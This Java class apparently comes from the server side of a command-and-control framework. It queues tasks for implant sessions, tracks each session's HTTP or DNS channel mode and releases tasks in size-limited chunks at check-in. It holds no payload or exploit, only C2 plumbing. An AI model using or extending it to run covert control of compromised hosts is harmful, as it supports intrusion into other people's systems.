package beacon;

import common.CommonUtils;

import java.io.ByteArrayOutputStream;
import java.util.*;

public class BeaconData {
    public static final int MODE_HTTP = 0;
    public static final int MODE_DNS = 1;
    public static final int MODE_DNS_TXT = 2;
    public static final int MODE_DNS6 = 3;
    protected Map queues = new HashMap();
    protected Map modes = new HashMap();
    protected Set tasked = new HashSet();

    protected List getQueue(String bid) {
        synchronized (this) {
            if (this.queues.containsKey(bid)) {
                return (List) this.queues.get(bid);
            }
            LinkedList result = new LinkedList();
            this.queues.put(bid, result);
            return result;
        }
    }

    public boolean isNewSession(String bid) {
        synchronized (this) {
            return !this.tasked.contains(bid);
        }
    }

    public void virgin(String bid) {
        synchronized (this) {
            this.tasked.remove(bid);
        }
    }

    public void task(String bid, byte[] data) {
        synchronized (this) {
            List queue = this.getQueue(bid);
            queue.add(data);
            this.tasked.add(bid);
        }
    }

    public void clear(String bid) {
        synchronized (this) {
            List queue = this.getQueue(bid);
            queue.clear();
            this.tasked.add(bid);
        }
    }

    public int getMode(String bid) {
        synchronized (this) {
            String mode = (String) this.modes.get(bid);
            if ("dns-txt".equals(mode)) {
                return 2;
            }
            if ("dns6".equals(mode)) {
                return 3;
            }
            if ("dns".equals(mode)) {
                return 1;
            }
        }
        return 0;
    }

    public void mode(String bid, String mode) {
        synchronized (this) {
            this.modes.put(bid, mode);
        }
    }

    public boolean hasTask(String bid) {
        synchronized (this) {
            List queue = this.getQueue(bid);
            return queue.size() > 0;
        }
    }

    public byte[] dump(String bid, int max) {
        synchronized (this) {
            int total = 0;
            List queue = this.getQueue(bid);
            if (queue.size() == 0) {
                return new byte[0];
            }
            ByteArrayOutputStream byteme = new ByteArrayOutputStream(8192);
            Iterator i = queue.iterator();
            while (i.hasNext()) {
                byte[] next = (byte[]) i.next();
                if (total + next.length < max) {
                    byteme.write(next, 0, next.length);
                    i.remove();
                    total += next.length;
                    continue;
                }
                if (next.length >= max) {
                    CommonUtils.print_error("Woah! Task " + next.length + " for " + bid + " is beyond our limit. Dropping it");
                    i.remove();
                    continue;
                }
                CommonUtils.print_warn("Chunking tasks for " + bid + "! " + next.length + " + " + total + " past threshold. " + queue.size() + " task(s) on hold until next checkin.");
                break;
            }
            return byteme.toByteArray();
        }
    }
}

